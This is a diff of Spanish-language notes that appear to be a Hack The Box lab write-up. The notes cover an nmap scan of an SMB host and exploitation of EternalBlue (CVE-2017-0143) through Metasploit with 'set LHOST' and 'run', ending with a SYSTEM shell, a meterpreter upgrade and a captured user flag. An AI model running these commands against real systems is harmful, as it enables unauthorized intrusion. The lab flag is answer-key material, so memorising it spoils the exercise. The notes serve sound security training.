@@ -17,21 +17,28 @@
 ---
 
 `nmap -p- -sV -sC --open -sS -vvv -n -Pn 10.10.11.116 -oN escaneo`
+
 ![Pasted image 20241123212931](../../Fotos/Pasted%20image%2020241123212931.png)
+
 - 445/tcp   open  microsoft-ds syn-ack ttl 127 Windows 7 Professional
 
 `nmap --script vuln -p445 10.10.10.40`
+
 ![Pasted image 20241123213401](../../Fotos/Pasted%20image%2020241123213401.png)
+
 - RCE
 
 `search CVE:CVE-2017-0143`
 - Buscamos la vulnerabilidad con metasploit
+
 ![Pasted image 20241123213627](../../Fotos/Pasted%20image%2020241123213627.png)
+
 - Confirmamos que el RCE se logra mediante la vulnerabilidad ETERNAL BLUE
 
 ![Pasted image 20241123213741](../../Fotos/Pasted%20image%2020241123213741.png)
 
 use 0
+
 ![Pasted image 20241123213801](../../Fotos/Pasted%20image%2020241123213801.png)
 
 ![Pasted image 20241123213823](../../Fotos/Pasted%20image%2020241123213823.png)
@@ -43,14 +50,17 @@ use 0
 
 `set LHOST 10.10.14.6`
 - interfaz de htb
+
 ![Pasted image 20241123214621](../../Fotos/Pasted%20image%2020241123214621.png)
 
 `run`
+
 ![Pasted image 20241123214716](../../Fotos/Pasted%20image%2020241123214716.png)
 
 `Maquin Vulnerada`
 
 ![Pasted image 20241123214756](../../Fotos/Pasted%20image%2020241123214756.png)
+
 - Somos root
 
 user flag: 38b95f0d54485d1af26b0bf0073c2657
@@ -64,6 +74,7 @@ para ver recursos compartidos smb
 ---
 
 ![Pasted image 20251227170911](../../Fotos/Pasted%20image%2020251227170911.png)
+
 - Mejora la shell a meterpreter para obtener una consola mas potente en este caso
 
 flag1.txt /s
